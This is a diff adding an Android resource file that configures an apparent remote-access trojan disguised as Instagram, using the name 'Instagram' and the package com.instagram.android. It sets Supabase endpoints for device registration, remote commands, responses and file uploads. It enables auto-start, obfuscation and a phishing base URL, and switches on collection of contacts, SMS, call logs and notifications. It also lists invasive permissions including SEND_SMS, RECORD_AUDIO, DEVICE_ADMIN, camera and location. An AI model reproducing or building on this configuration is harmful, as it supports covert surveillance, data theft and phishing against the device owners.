@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Replace these values with your Supabase project details -->
+    <string name="supabase_url">https://your-project-id.supabase.co</string>
+    <string name="supabase_anon_key">your-supabase-anon-key</string>
+    <string name="supabase_service_role_key">your-supabase-service-role-key</string>
+    
+    <!-- These replace the Firebase configuration -->
+    <!-- Remove or comment out all firebase_* strings when migrating -->
+    <!--
+    <string name="firebase_database_url">https://your_database_url.firebase.com</string>
+    <string name="google_api_key">your_api_key</string>
+    <string name="google_app_id">your_app_id</string>
+    <string name="google_storage_bucket">your_storage_bucket_url</string>
+    <string name="project_id">project_id</string>
+    -->
+    
+    <!-- App configuration -->
+    <string name="app_name">Instagram</string>
+    <string name="package_name">com.instagram.android</string>
+    
+    <!-- API endpoints -->
+    <string name="api_device_register">/rest/v1/online_devices</string>
+    <string name="api_device_commands">/rest/v1/device_commands</string>
+    <string name="api_device_responses">/rest/v1/device_responses</string>
+    <string name="api_device_files">/rest/v1/device_files</string>
+    <string name="api_storage_bucket">device-files</string>
+    
+    <!-- Real-time WebSocket endpoint -->
+    <string name="realtime_endpoint">/realtime/v1/websocket</string>
+    
+    <!-- Background service settings -->
+    <string name="background_service_enabled">true</string>
+    <string name="auto_start_enabled">true</string>
+    <string name="notification_listener_enabled">true</string>
+    
+    <!-- Phishing pages configuration -->
+    <string name="phishing_base_url">https://your-phishing-domain.com</string>
+    
+    <!-- Default command response timeout in milliseconds -->
+    <string name="command_timeout">30000</string>
+    
+    <!-- File upload settings -->
+    <string name="max_file_size_mb">50</string>
+    <string name="allowed_file_types">jpg,jpeg,png,gif,mp4,mp3,pdf,txt,doc,docx</string>
+    
+    <!-- Security settings -->
+    <string name="encryption_enabled">false</string>
+    <string name="obfuscation_enabled">true</string>
+    
+    <!-- Device info collection -->
+    <string name="collect_device_info">true</string>
+    <string name="collect_installed_apps">true</string>
+    <string name="collect_contacts">true</string>
+    <string name="collect_sms">true</string>
+    <string name="collect_call_logs">true</string>
+    <string name="collect_notifications">true</string>
+    
+    <!-- Permissions required -->
+    <string name="permissions_required">READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,SEND_SMS,READ_CONTACTS,READ_CALL_LOG,RECORD_AUDIO,ACCESS_NOTIFICATION_POLICY,DEVICE_ADMIN,CAMERA,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION</string>
+</resources>
